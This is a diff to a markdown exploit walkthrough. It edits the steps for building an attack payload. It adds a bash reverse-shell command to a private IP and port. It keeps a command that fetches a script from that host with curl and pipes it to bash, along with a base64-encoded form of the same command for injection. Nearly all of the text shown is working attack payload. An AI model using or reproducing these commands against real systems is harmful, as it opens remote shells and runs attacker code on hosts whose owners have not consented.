@@ -53,11 +53,11 @@ touch index.html
 
 Inside the ```index.html``` file put the following payload and change the IP address to the one that suits to your environment
 
-```
-$(curl 192.168.1.6:8085|bash) 
+``` 
+/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.1.6/8082 0>&1" &
 ``` 
 
-4. convert the payload above in base64 format as seen below 
+4. convert the payload ```$(curl 192.168.1.6:8085|bash)``` in base64 format as seen below (change the IP address with the one that suits to your environment) 
 
 ```
 JChjdXJsIDE5Mi4xNjguMS42OjgwODV8YmFzaCk=
